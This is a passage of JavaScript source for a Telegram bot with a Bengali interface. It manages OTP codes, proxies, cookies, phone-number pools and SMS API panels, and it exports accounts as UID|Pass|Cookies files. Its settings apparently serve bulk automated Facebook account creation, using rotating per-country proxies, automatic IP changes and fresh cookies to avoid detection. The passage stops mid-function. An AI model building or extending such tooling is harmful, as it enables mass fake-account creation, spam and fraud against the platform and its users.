      const det = detectCountryFromNumber(`+${item.phone}`, '880', item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : '');
      const rsCnt = Number(item.resendCount || 0);
      lines.push(
        `${idx + 1}. ${badge} <code>+${escapeHtml(item.phone)}</code>${iso ? ` [<b>${escapeHtml(iso)}</b>]` : ''} — <b>${escapeHtml(item.flow === 'recovery' ? 'PC-RECOVER' : item.status)}</b>${rsCnt > 0 ? ` • 🔁${rsCnt}x` : ''} (${escapeHtml(item.name)})`
      );
      rows.push([
        btnOk(`🔑 OTP দিন (+${item.phone.slice(-5)})`, `otp:enter:${item.phone}`),
        btnOk(`📤 OTP Send (PC)`, `otp:pc_send:${item.phone}`),
        btnNav(`📡 Lamix চেক`, `otp:check_lamix:${item.phone}`),
      ]);
      rows.push([
        btnNav(`🔁 Resend`, `otp:resend:${item.phone}`),
        btnNav(`🔎 চেক করুন`, `otp:check:${item.phone}`),
        btnNav(`🔍 বিস্তারিত`, `otp:inspect:${item.phone}`),
      ]);
      rows.push([
        btnNav(`⏭ পরে করবো`, `otp:defer:${item.phone}`),
        btnBad(`🗑 মুছুন`, `otp:del:${item.phone}`),
      ]);
    });
    if (items.length > 5) {
      lines.push(`\n<i>প্রথম ৫টি দেখানো হচ্ছে (মোট ${items.length}টি)।</i>`);
    }
    rows.push([
      btnOk('📡 প্যানেল OTP আনুন', 'otp:panel_sync'),
      btnOk('📡 সার্ভার ২ OTP আনুন', 'otp:lamix_sync'),
      btnNav('➕ ম্যানুয়াল', 'otp:manual'),
    ]);
    rows.push([
      btnBad('🧹 সব মুছুন', 'otp:clearall'),
      btnOk('🔄 রিফ্রেশ', 'menu:otp'),
    ]);
    rows.push([btnNav('⬅️ মেইন মেনু', 'menu:home')]);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderSettings(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const doneCnt = readUserDone(uid).size;
    const [countryName] = getCountryInfo(cfg.cc);
    const engineDesc =
      cfg.engine_mode === 'limited'
        ? 'Limited FB (দ্রুত ও হালকা)'
        : cfg.engine_mode === 'classic'
        ? 'Classic (m.facebook)'
        : 'Hybrid (উভয় মোড)';
    const pxModeDesc =
      cfg.proxy_mode === 'fastest'
        ? 'সবচেয়ে দ্রুত (Fastest)'
        : cfg.proxy_mode === 'random'
        ? 'এলোমেলো (Random)'
        : 'পালাক্রমে (Rotate)';
    const autoResendVal = Number(cfg.auto_otp_resend ?? 2);
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const txt = [
      `⚙️ <b>বটের সব সেটিংস ও পাসওয়ার্ড</b>`,
      DIVIDER,
      `এখান থেকে অ্যাকাউন্টের পাসওয়ার্ড, স্পিড, প্রক্সি এবং নিরাপত্তা সেটিংস বদলাতে পারবেন:`,
      ``,
      `<b>পরিচয় ও পাসওয়ার্ড</b>`,
      `├ 🌍 ডিফল্ট কান্ট্রি কোড: <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})`,
      `├ 🔑 ডিফল্ট পাসওয়ার্ড: ${cfg.password ? `<code>${escapeHtml(cfg.password)}</code>` : '🔴 <b>সেট করা নেই</b>'}`,
      `├ 🌐 ডিফল্ট প্রক্সি: <code>${cfg.proxy ? escapeHtml(cfg.proxy) : 'নেই (Direct/পুল)'}</code>`,
      `└ 🔀 প্রক্সি ধরন: <code>${escapeHtml(pxModeDesc)}</code>`,
      ``,
      `<b>কাজের স্পিড ও ইঞ্জিন</b>`,
      `├ 🚀 ইঞ্জিন মোড: <code>${escapeHtml(engineDesc)}</code>`,
      `├ ⚡ একসাথে কাজ (Threads): <code>${cfg.threads ?? 4}x</code>  •  ⏱ বিরতি (Delay): <code>${cfg.delay ?? 1}s</code>`,
      `├ 🔁 অটো OTP রিসেন্ড: <code>${autoResendVal}x</code> ${autoResendVal > 0 ? '(কোড না এলে নিজে থেকেই আবার পাঠাবে)' : '(বন্ধ)'}`,
      `└ 📦 ব্যাচ ব্রেক: <code>${cfg.batch}</code>  •  🔁 চেষ্টা (Retries): <code>${cfg.retries}</code>  •  ⌛ টাইমআউট: <code>${cfg.timeout}s</code>`,
      ``,
      `<b>ডাটা সাশ্রয় ও সুরক্ষা</b>`,
      `├ 🔍 GQL আগে চেক: ${cfg.precheck_gql !== false ? '🟢 চালু' : '🔴 বন্ধ'}  •  📡 GQL পথ: ${cfg.gql_via_direct !== false ? '⚡ DIRECT (0 ডাটা)' : '🌐 PROXY'}`,
      `├ 💾 প্রক্সি ডাটা সেভার: ${cfg.proxy_saver !== false ? '🟢 চালু (~75% কম ডাটা)' : '🔴 বন্ধ'}  •  🛡 স্ট্রিক্ট প্রক্সি: ${cfg.strict_proxy !== false ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `├ ♻️ অটো IP পরিবর্তন: ${cfg.auto_proxy_refresh !== false ? '🟢 চালু' : '🔴 বন্ধ'}  •  🌍 অটো দেশ প্রক্সি: ${cfg.auto_proxy_country !== false ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `├ ⏭ Skip Probe: ${cfg.skip_probe ? '🟢 চালু' : '🔴 বন্ধ'}  •  🎲 প্রতিবার নতুন কুকি: ${cfg.fresh_id ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `└ 🔄 পুরনো নাম্বার বাদ: ${cfg.resume_mode !== false ? '🟢 চালু' : '🔴 বন্ধ'} (<code>${doneCnt}</code>টি)  •  📊 প্রক্সি খরচ: <code>${formatBytes(totalPxBytes)}</code>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('⚡ সুপার ফাস্ট সেট (0s • 6x)', 'set:turbo'),
          btnNav(`⚡ স্পিড (${cfg.threads ?? 4}x)`, 'set:cycle_threads'),
        ],
        [
          btnNav(`🌍 কোড (+${cfg.cc})`, 'set:cc'),
          cfg.password ? btnNav('🔑 পাসওয়ার্ড বদলান', 'set:pw') : btnOk('🔑 পাসওয়ার্ড সেট করুন', 'set:pw'),
          btnNav('👁 পাসওয়ার্ড দেখুন', 'set:viewpw'),
        ],
        [
          btnNav(`🚀 ইঞ্জিন: ${(cfg.engine_mode || 'hybrid').toUpperCase()}`, 'set:cycle_engine'),
          btnNav(`🔀 প্রক্সি: ${(cfg.proxy_mode || 'rotate').toUpperCase()}`, 'set:cycle_pxmode'),
        ],
        [
          btnNav('🌐 ডিফল্ট প্রক্সি', 'set:proxy'),
          btnNav(`⏱ বিরতি (${cfg.delay ?? 1}s)`, 'set:delay'),
          btnNav(`📦 ব্রেক (${cfg.batch})`, 'set:batch'),
        ],
        [
          btnNav(`🔁 চেষ্টা (${cfg.retries})`, 'set:retries'),
          btnNav(`⌛ সময় (${cfg.timeout}s)`, 'set:timeout'),
          btnNav(`🔁 অটো রিসেন্ড (${autoResendVal}x)`, 'set:cycle_otpresend'),
        ],
        [
          cfg.proxy_saver !== false ? btnOk('💾 ডাটা সেভার: চালু', 'set:toggle_pxsaver') : btnBad('💾 ডাটা সেভার: বন্ধ', 'set:toggle_pxsaver'),
          cfg.gql_via_direct !== false ? btnOk('⚡ GQL: ফ্রি ডাইরেক্ট', 'set:toggle_gqldirect') : btnNav('🌐 GQL: প্রক্সি দিয়ে', 'set:toggle_gqldirect'),
        ],
        [
          cfg.auto_proxy_refresh !== false ? btnOk('♻️ অটো IP বদল: চালু', 'set:toggle_autorefresh') : btnBad('♻️ অটো IP বদল: বন্ধ', 'set:toggle_autorefresh'),
          cfg.auto_proxy_country !== false ? btnOk('🌍 অটো দেশ প্রক্সি: চালু', 'set:toggle_autocountry') : btnBad('🌍 অটো দেশ প্রক্সি: বন্ধ', 'set:toggle_autocountry'),
        ],
        [
          cfg.precheck_gql !== false ? btnOk('🔍 GQL চেক: চালু', 'set:toggle_gql') : btnBad('🔍 GQL চেক: বন্ধ', 'set:toggle_gql'),
          cfg.strict_proxy !== false ? btnOk('🛡 স্ট্রিক্ট প্রক্সি: চালু', 'set:toggle_strictpx') : btnBad('🛡 স্ট্রিক্ট প্রক্সি: বন্ধ', 'set:toggle_strictpx'),
        ],
        [
          cfg.skip_probe ? btnOk('⏭ Skip Probe: চালু', 'set:toggle_skip') : btnBad('⏭ Skip Probe: বন্ধ', 'set:toggle_skip'),
          cfg.fresh_id ? btnOk('🎲 নতুন কুকি: চালু', 'set:toggle_fresh') : btnBad('🎲 নতুন কুকি: বন্ধ', 'set:toggle_fresh'),
        ],
        [
          cfg.resume_mode !== false ? btnOk('🔄 পুরনো বাদ: চালু', 'set:toggle_resume') : btnBad('🔄 পুরনো বাদ: বন্ধ', 'set:toggle_resume'),
          btnBad(`🧹 পুরনো মুছুন (${doneCnt})`, 'run:clear_done'),
        ],
        [
          btnNav(`💻 PC OTP: ${cfg.pc_otp_resends ?? 3}x`, 'pc:set_resends'),
          btnOk('🧼 ১-ক্লিক ফ্রেশ কুকি', 'cookies:fresh_all'),
        ],
        [
          btnBad('🗑 আমার সব ডাটা মুছুন', 'user:wipe_all_confirm'),
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderCookiesMenu(chatId, uid, editMsgId) {
    const raw = readUserCookies(uid);
    const preview = raw.length > 900 ? raw.slice(0, 900) + '...' : raw;
    const txt = [
      `🍪 <b>কুকিজ ও ফ্রেশ ক্লিনার</b>`,
      DIVIDER,
      `আপনার বর্তমান বেস কুকি:`,
      `<blockquote><code>${escapeHtml(preview)}</code></blockquote>`,
      ``,
      `🧼 <b>১-ক্লিক ফ্রেশ কুকি ও ক্যাশ:</b> নতুন কুকি তৈরি করে ও পুরনো হিস্টোরি মুছে দেয় যাতে আইডি নষ্ট না হয়।`,
      `🗑 <b>সব ডাটা মুছুন:</b> আপনার কুকি, OTP, অ্যাকাউন্টস ও প্রক্সি সম্পূর্ণ পরিষ্কার করে।`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('🧼 ১-ক্লিক ফ্রেশ কুকি ও ক্যাশ ক্লিন', 'cookies:fresh_all'),
        ],
        [
          btnOk('🎲 নতুন কুকি বানান', 'cookies:regen'),
          btnNav('✏️ নিজের কুকি পেস্ট করুন', 'cookies:edit'),
        ],
        [
          btnBad('🗑 আমার সব ডাটা মুছুন', 'user:wipe_all_confirm'),
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAccountsMenu(chatId, uid, filter = 'ready', editMsgId) {
    const accounts = readUserAccounts(uid);
    const okOnly = accounts.filter((a) => a.status === 'OK');
    const cfCnt = accounts.filter((a) => a.status === 'CONFIRM' || a.status === 'CHECKPOINT').length;
    const failOnly = accounts.filter((a) => !['OK', 'CONFIRM', 'CHECKPOINT'].includes(a.status));

    const list = filter === 'ready' ? okOnly : filter === 'failed' ? failOnly : accounts;
    const title = filter === 'ready' ? 'রেডি অ্যাকাউন্টস' : filter === 'failed' ? 'ব্যর্থ / ব্যবহৃত নাম্বার' : 'সব লগ';

    const lines = [
      `📦 <b>তৈরি হওয়া অ্যাকাউন্ট • ${title}</b>`,
      DIVIDER,
      `📊 মোট: <code>${accounts.length}</code>  •  ✅ রেডি: <code>${okOnly.length}</code>  •  🔐 পেন্ডিং OTP: <code>${cfCnt}</code>  •  ❌ ব্যর্থ: <code>${failOnly.length}</code>`,
      `নিচের বাটন থেকে <code>.txt</code> বা <code>.csv</code> ফাইলে অ্যাকাউন্ট ডাউনলোড করতে পারবেন:`,
      ``,
    ];
    list.slice(0, 10).forEach((a, i) => {
      if (a.status === 'OK') {
        lines.push(`${i + 1}. ✅ <code>${escapeHtml(a.uid || '-')}|${escapeHtml(a.password)}</code> (+${escapeHtml(a.number)})`);
      } else {
        const errInfo = a.err ? ` — <i>${escapeHtml(a.err.slice(0, 48))}</i>` : '';
        lines.push(`${i + 1}. <b>[${escapeHtml(a.status)}]</b> +${escapeHtml(a.number)}${errInfo}`);
      }
    });
    if (list.length === 0) lines.push('<i>এই তালিকায় এখনো কোনো তথ্য নেই।</i>');

    const accRows = [];
    const seenQuickPhones = new Set();
    for (const a of list.slice(0, 6)) {
      const cleanNum = String(a.number || '').replace(/\D/g, '');
      if (!cleanNum || seenQuickPhones.has(cleanNum)) continue;
      seenQuickPhones.add(cleanNum);
      if (accRows.length < 4) {
        accRows.push([
          btnOk(`📤 OTP (+${cleanNum.slice(-5)})`, `otp:pc_send:${cleanNum}`),
          btnNav(`📡 Lamix (+${cleanNum.slice(-5)})`, `otp:check_lamix:${cleanNum}`),
        ]);
      }
    }

    const kb = {
      inline_keyboard: [
        ...accRows,
        [
          btnOk(`${filter === 'ready' ? '● ' : ''}✅ রেডি (${okOnly.length})`, 'accounts:view:ready'),
          btnBad(`${filter === 'failed' ? '● ' : ''}❌ ব্যর্থ (${failOnly.length})`, 'accounts:view:failed'),
          btnNav(`${filter === 'all' ? '● ' : ''}📜 সবগুলো (${accounts.length})`, 'accounts:view:all'),
        ],
        [
          btnOk('📄 রেডি আইডি (.txt)', 'accounts:txt'),
          btnOk('📋 UID|Pass|Cookies ফাইল', 'accounts:uidpasscookies'),
        ],
        [
          btnNav('📊 এক্সেল/CSV ডাউনলোড', 'accounts:csv'),
          btnNav('📋 লগইন শীট CSV', 'accounts:loginsheet'),
        ],
        [
          btnNav('📝 সম্পূর্ণ লগ (.txt)', 'accounts:fulltxt'),
          btnNav('🔍 শেষ অ্যাকাউন্টের কুকি', 'accounts:lastcookie'),
        ],
        [
          btnBad('🧹 তালিকা মুছুন', 'accounts:clearconfirm'),
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };

    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderProxiesMenu(chatId, uid, editMsgId) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const list = readUserProxies(uid);
    const globalCnt = st.shareGlobalProxies ? readGlobalProxies().length : 0;
    const autoRefresh = cfg.auto_proxy_refresh !== false;
    const autoCountry = cfg.auto_proxy_country !== false;
    const proxySaver = cfg.proxy_saver !== false;
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const preview = list
      .slice(0, 10)
      .map((p, i) => {
        const h = proxyHealth.get(proxyHealthKey(p));
        const cap = inspectProxyCapabilities(p);
        const capTag =
          cap.hasCountryTag || cap.hasSessionTag
            ? ` <i>[${cap.countryCode || 'AUTO'}${cap.hasSessionTag ? ` • ssid:${escapeHtml(cap.sessionId.slice(0, 6))}` : ''}]</i>`
            : '';
        const tag = h
          ? h.streakFail >= 2
            ? ` 🔴 (${escapeHtml(h.lastErr || 'fail')})`
            : h.lastLatencyMs
            ? ` 🟢 ${h.lastLatencyMs}ms${h.exitIp ? ` [${escapeHtml(h.exitIp)}]` : ''}`
            : ''
          : '';
        return `${i + 1}. <code>${escapeHtml(p)}</code>${capTag}${tag}`;
      })
      .join('\n');
    const txt = [
      `🌐 <b>প্রক্সি সেটআপ ও ম্যানেজার (${list.length}টি)</b>`,
      DIVIDER,
      `এখানে প্রক্সি যোগ করলে বট প্রতিটি অ্যাকাউন্টের দেশের IP দিয়ে নিরাপদে কাজ করবে:`,
      `🔀 <b>ধরন:</b> <code>${escapeHtml((cfg.proxy_mode || 'rotate').toUpperCase())}</code>  •  🛡 <b>স্ট্রিক্ট:</b> ${cfg.strict_proxy !== false ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `♻️ <b>অটো IP বদল:</b> ${autoRefresh ? '🟢 চালু' : '🔴 বন্ধ'}  •  🌍 <b>অটো দেশ প্রক্সি:</b> ${autoCountry ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `💾 <b>ডাটা সেভার:</b> ${proxySaver ? '🟢 চালু (~75% কম খরচ)' : '🔴 বন্ধ'}  •  📊 <b>খরচ:</b> <code>${formatBytes(totalPxBytes)}</code>`,
      ``,
      preview || '<i>এখনো কোনো নিজস্ব প্রক্সি যোগ করা হয়নি।</i>',
      list.length > 10 ? `<i>... আরও ${list.length - 10}টি প্রক্সি আছে</i>` : '',
      globalCnt > 0 ? `\n<blockquote>🌍 অ্যাডমিনের শেয়ার করা প্রক্সি চালু আছে: <b>${globalCnt}</b>টি</blockquote>` : '',
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('➕ প্রক্সি যোগ করুন', 'proxies:add'),
          btnOk('♻️ এখনই IP বদলান', 'proxies:refresh_now'),
        ],
        [
          autoRefresh ? btnOk('🔄 অটো IP বদল: চালু', 'proxies:toggle_autorefresh') : btnBad('🔄 অটো IP বদল: বন্ধ', 'proxies:toggle_autorefresh'),
          autoCountry ? btnOk('🌍 অটো দেশ: চালু', 'proxies:toggle_autocountry') : btnBad('🌍 অটো দেশ: বন্ধ', 'proxies:toggle_autocountry'),
        ],
        [
          proxySaver ? btnOk('💾 ডাটা সেভার: চালু', 'proxies:toggle_pxsaver') : btnBad('💾 ডাটা সেভার: বন্ধ', 'proxies:toggle_pxsaver'),
          btnNav('🧪 প্রক্সি টেস্ট করুন', 'proxies:test'),
        ],
        [
          btnOk('⚡ দ্রুতগুলো আগে আনুন', 'proxies:sort'),
          btnBad('🧹 নষ্ট প্রক্সি মুছুন', 'proxies:prunedead'),
        ],
        [
          btnBad('➖ নির্দিষ্ট প্রক্সি মুছুন', 'proxies:removeone'),
          btnBad('🗑 সব প্রক্সি মুছুন', 'proxies:clear'),
        ],
        [btnNav('⬅️ মেইন মেনু', 'menu:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderLogsMenu(chatId, uid, editMsgId) {
    const userLogs = readUserLogs(uid, 25);
    const joined = userLogs.join('\n') || 'এখনো কোনো কাজের রিপোর্ট রেকর্ড হয়নি।';
    const capped = joined.length > 2600 ? '...\n' + joined.slice(-2600) : joined;
    const txt = [
      `📜 <b>সর্বশেষ কাজের রিপোর্ট / LOGS (${userLogs.length}টি)</b>`,
      DIVIDER,
      `<blockquote><code>${escapeHtml(capped)}</code></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('📄 শেষ HTML রিপোর্ট নিন', 'logs:html'),
          btnBad('🧹 লগ মুছুন', 'logs:clear'),
        ],
        [
          btnOk('🔄 রিফ্রেশ', 'menu:logs'),
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  // ── ADMIN COUNTRY & NUMBER POOL INVENTORY ─────────────────────────────────
  let countriesStoreCache = null;
  let panelsStoreCache = null;
  const panelSmsCache = new Map(); // panelId -> { fetchedAt, rows }
  const panelRequestState = new Map(); // panelId -> { blockedUntil, lastScanAt, inFlight }
  const activeOtpVerifyPhones = new Set();
  const seenBackgroundSmsKeys = new Set();
  let panelScannerTimer = null;
  let panelScannerBusy = false;

  function readCountriesStore() {
    if (countriesStoreCache) return countriesStoreCache;
    try {
      if (fs.existsSync(FILES.adminCountries)) {
        const parsed = JSON.parse(fs.readFileSync(FILES.adminCountries, 'utf-8'));
        if (parsed && typeof parsed === 'object') {
          countriesStoreCache = {
            nextCountryId: Number(parsed.nextCountryId) || 1,
            nextNumberId: Number(parsed.nextNumberId) || 1,
            countries: Array.isArray(parsed.countries) ? parsed.countries : [],
            numbers: Array.isArray(parsed.numbers) ? parsed.numbers : [],
          };
          return countriesStoreCache;
        }
      }
    } catch {
      // ignore
    }
    countriesStoreCache = { nextCountryId: 1, nextNumberId: 1, countries: [], numbers: [] };
    return countriesStoreCache;
  }

  function writeCountriesStore(store) {
    countriesStoreCache = store;
    fs.writeFileSync(FILES.adminCountries, JSON.stringify(store, null, 2), 'utf-8');
    return store;
  }

  function getCountryInventoryStats() {
    const store = readCountriesStore();
    const counts = new Map();
    for (const n of store.numbers) {
      let c = counts.get(n.countryId);
      if (!c) {
        c = { total: 0, used: 0, available: 0 };
        counts.set(n.countryId, c);
      }
      c.total += 1;
      if (n.used) c.used += 1;
      else c.available += 1;
    }
    return store.countries
      .filter((c) => c.active !== false)
      .map((c) => {
        const st = counts.get(c.id) || { total: 0, used: 0, available: 0 };
        return { ...c, ...st };
      });
  }

  function findCountryById(countryId) {
    const idNum = Number(countryId);
    if (!Number.isFinite(idNum)) return null;
    const store = readCountriesStore();
    return store.countries.find((c) => c.id === idNum && c.active !== false) || null;
  }

  function addAdminCountry(name) {
    const clean = String(name || '').trim().slice(0, 60);
    if (!clean) return { ok: false, reason: 'empty' };
    const store = readCountriesStore();
    const exists = store.countries.find((c) => c.active !== false && c.name.toLowerCase() === clean.toLowerCase());
    if (exists) return { ok: false, reason: 'exists', country: exists };
    const country = {
      id: store.nextCountryId++,
      name: clean,
      active: true,
      createdAt: Date.now(),
    };
    store.countries.push(country);
    writeCountriesStore(store);
    return { ok: true, country };
  }

  function deleteAdminCountry(countryId) {
    const idNum = Number(countryId);
    const store = readCountriesStore();
    const target = store.countries.find((c) => c.id === idNum);
    if (!target) return { ok: false };
    store.countries = store.countries.filter((c) => c.id !== idNum);
    const beforeNums = store.numbers.length;
    store.numbers = store.numbers.filter((n) => n.countryId !== idNum);
    writeCountriesStore(store);
    return { ok: true, country: target, removedNumbers: beforeNums - store.numbers.length };
  }

  function resetAdminCountryNumbers(countryId) {
    const idNum = Number(countryId);
    const store = readCountriesStore();
    const target = store.countries.find((c) => c.id === idNum);
    if (!target) return { ok: false, deleted: 0 };
    const before = store.numbers.length;
    store.numbers = store.numbers.filter((n) => n.countryId !== idNum);
    const deleted = before - store.numbers.length;
    writeCountriesStore(store);
    return { ok: true, country: target, deleted };
  }

  function addNumbersToAdminCountry(countryId, rawNumbers) {
    const idNum = Number(countryId);
    const store = readCountriesStore();
    const target = store.countries.find((c) => c.id === idNum && c.active !== false);
    if (!target) return { ok: false, added: 0, skippedDupes: 0 };
    const cleanList = normalizeUniquePoolNumbers(rawNumbers);
    const existingSet = new Set(store.numbers.map((n) => n.number));
    let added = 0;
    let skippedDupes = 0;
    for (const num of cleanList) {
      if (existingSet.has(num)) {
        skippedDupes += 1;
        continue;
      }
      existingSet.add(num);
      store.numbers.push({
        id: store.nextNumberId++,
        countryId: idNum,
        number: num,
        used: false,
        assignedUid: null,
        assignedAt: null,
      });
      added += 1;
    }
    writeCountriesStore(store);
    return { ok: true, country: target, added, skippedDupes, parsedTotal: cleanList.length };
  }

  function claimAvailableNumbers(uid, countryId, count = 1) {
    const idNum = Number(countryId);
    const want = Math.max(1, Math.min(25, Number(count) || 1));
    const store = readCountriesStore();
    const picked = [];
    const now = Date.now();
    for (const row of store.numbers) {
      if (row.countryId === idNum && !row.used) {
        row.used = true;
        row.assignedUid = String(uid);
        row.assignedAt = now;
        picked.push({ id: row.id, countryId: row.countryId, number: row.number, assignedAt: now });
        if (picked.length >= want) break;
      }
    }
    if (picked.length > 0) writeCountriesStore(store);
    return picked;
  }

  function consumeClaimedNumber(numberIdOrDigits) {
    const store = readCountriesStore();
    const before = store.numbers.length;
    if (typeof numberIdOrDigits === 'number') {
      store.numbers = store.numbers.filter((n) => n.id !== numberIdOrDigits);
    } else {
      const clean = String(numberIdOrDigits || '').replace(/\D/g, '');
      store.numbers = store.numbers.filter((n) => n.number !== clean);
    }
    if (store.numbers.length !== before) {
      writeCountriesStore(store);
      return true;
    }
    return false;
  }

  // ── ADMIN OTP API PANELS STORE & MULTI-AUTH FETCHER ───────────────────────
  function readPanelsStore() {
    if (panelsStoreCache) return panelsStoreCache;
    try {
      if (fs.existsSync(FILES.adminPanels)) {
        const parsed = JSON.parse(fs.readFileSync(FILES.adminPanels, 'utf-8'));
        if (parsed && typeof parsed === 'object') {
          panelsStoreCache = {
            nextPanelId: Number(parsed.nextPanelId) || 1,
            panels: Array.isArray(parsed.panels) ? parsed.panels : [],
          };
          return panelsStoreCache;
        }
      }
    } catch {
      // ignore
    }
    panelsStoreCache = { nextPanelId: 1, panels: [] };
    return panelsStoreCache;
  }

  function writePanelsStore(store) {
    panelsStoreCache = store;
    fs.writeFileSync(FILES.adminPanels, JSON.stringify(store, null, 2), 'utf-8');
    return store;
  }

  function findPanelById(panelId) {
    const idNum = Number(panelId);
    if (!Number.isFinite(idNum)) return null;
    return readPanelsStore().panels.find((p) => p.id === idNum) || null;
  }

  function updatePanelById(panelId, patch) {
    const idNum = Number(panelId);
    const store = readPanelsStore();
    const idx = store.panels.findIndex((p) => p.id === idNum);
    if (idx < 0) return null;
    store.panels[idx] = { ...store.panels[idx], ...patch };
    writePanelsStore(store);
    return store.panels[idx];
  }

  function addAdminApiPanel({ name, stats_url, api_key = '', scan_interval = 5 }) {
    const store = readPanelsStore();
    const panel = {
      id: store.nextPanelId++,
      name: String(name || 'API Panel').trim().slice(0, 60),
      stats_url: String(stats_url || '').trim(),
      api_key: String(api_key || '').trim(),
      scan_interval: Math.max(3, Math.min(86400, Number(scan_interval) || 5)),
      panel_type: 'api',
      active: true,
      api_method: 'GET',
      api_auth_type: 'auto',
      api_auth_name: '',
      api_rows_path: '',
      api_number_field: '',
      api_sender_field: '',
      api_message_field: '',
      api_timestamp_field: '',
      api_range_field: '',
      number_col_idx: 2,
      sender_col_idx: 3,
      message_col_idx: 5,
      last_seen_ts: '',
      last_seen_key: '',
      last_scanned_at: 0,
      api_last_error: '',
      last_sms_json: null,
      createdAt: Date.now(),
    };
    store.panels.push(panel);
    writePanelsStore(store);
    return panel;
  }

  function deleteAdminPanel(panelId) {
    const idNum = Number(panelId);
    const store = readPanelsStore();
    const target = store.panels.find((p) => p.id === idNum);
    if (!target) return null;
    store.panels = store.panels.filter((p) => p.id !== idNum);
    writePanelsStore(store);
    forgetPanelRuntimeState(idNum);
    return target;
  }

  function forgetPanelRuntimeState(panelId) {
    panelSmsCache.delete(panelId);
    panelRequestState.delete(panelId);
  }

  async function executePanelHttpAttempt(panelId, baseUrl, attempt) {
    let st = panelRequestState.get(panelId);
    if (!st) {
      st = { blockedUntil: 0, lastScanAt: 0 };
      panelRequestState.set(panelId, st);
    }
    const now = Date.now();
    if (st.blockedUntil > now) {
      const waitMs = Math.min(35000, st.blockedUntil - now);
      await new Promise((r) => setTimeout(r, waitMs));
    }

    let finalUrl = String(baseUrl || '').trim();
    if (attempt.params && typeof attempt.params === 'object') {
      const u = new URL(finalUrl);
      for (const [k, v] of Object.entries(attempt.params)) {
        u.searchParams.set(k, String(v));
      }
      finalUrl = u.toString();
    }

    const fetchOpts = {
      method: attempt.method || 'GET',
      headers: { ...(attempt.headers || {}) },
      signal: AbortSignal.timeout(15000),
    };
    if (attempt.form) {
      const formParams = new URLSearchParams();
      for (const [k, v] of Object.entries(attempt.form)) formParams.set(k, String(v));
      fetchOpts.body = formParams.toString();
      fetchOpts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (attempt.json) {
      fetchOpts.body = JSON.stringify(attempt.json);
      fetchOpts.headers['Content-Type'] = 'application/json';
    }

    const resp = await fetch(finalUrl, fetchOpts);
    const buf = Buffer.from(await resp.arrayBuffer());
    if (buf.length > API_MAX_RESPONSE_BYTES) {
      throw new Error(`API response exceeds ${API_MAX_RESPONSE_BYTES / 1024} KB`);
    }
    const text = buf.toString('utf-8');
    let payload = null;
    try {
      payload = JSON.parse(text);
    } catch {
      payload = null;
    }
    return { status: resp.status, headers: resp.headers, text, payload };
  }

  async function panelFetchSms(panel, limit = null, forceRefresh = false) {
    if (!panel || !panel.stats_url) return [];
    const panelKey = panel.id;
    const staleRows = panelSmsCache.get(panelKey)?.rows || (panel.last_sms_json ? [panel.last_sms_json] : []);
    if (!forceRefresh) {
      const cached = panelSmsCache.get(panelKey);
      if (cached && Date.now() - cached.fetchedAt < API_SMS_CACHE_TTL_MS) {
        return limit ? cached.rows.slice(0, limit) : cached.rows;
      }
    }

    try {
      const parsed = new URL(panel.stats_url);
      if (!['http:', 'https:'].includes(parsed.protocol) || !parsed.host) {
        return limit ? staleRows.slice(0, limit) : staleRows;
      }
    } catch {
      updatePanelById(panelKey, { api_last_error: 'Invalid API URL' });
      return limit ? staleRows.slice(0, limit) : staleRows;
    }

    const attempts = _apiRequestAttempts(panel);
    if (attempts.length === 0) {
      updatePanelById(panelKey, { api_last_error: 'Invalid authentication configuration' });
      return null;
    }

    let data = null;
    let authFailed = false;
    let throttledStatus = null;
    let lastHttpStatus = 0;

    try {
      for (let i = 0; i < attempts.length; i++) {
        const res = await executePanelHttpAttempt(panelKey, panel.stats_url, attempts[i]);
        lastHttpStatus = res.status;
        if (_apiResponseIsAuthError(res.status, res.payload)) {
          authFailed = true;
          continue;
        }
        if (res.status === 429) {
          throttledStatus = res;
          if (String(panel.api_auth_type || 'auto').toLowerCase() === 'auto' && i < attempts.length - 1) {
            continue;
          }
          break;
        }
        if (res.status >= 500 && i < attempts.length - 1) {
          continue;
        }
        if (res.status < 200 || res.status >= 300) {
          throw new Error(`HTTP ${res.status}`);
        }
        if (res.payload === null) {
          throw new Error('Response is not valid JSON');
        }
        data = res.payload;
        authFailed = false;
        if (String(panel.api_auth_type || 'auto').toLowerCase() === 'auto') {
          const [detectedType, detectedName] = _apiAutoAuthConfig(i);
          if (detectedType) {
            updatePanelById(panelKey, { api_auth_type: detectedType, api_auth_name: detectedName });
            panel.api_auth_type = detectedType;
            panel.api_auth_name = detectedName;
          }
        }
        break;
      }

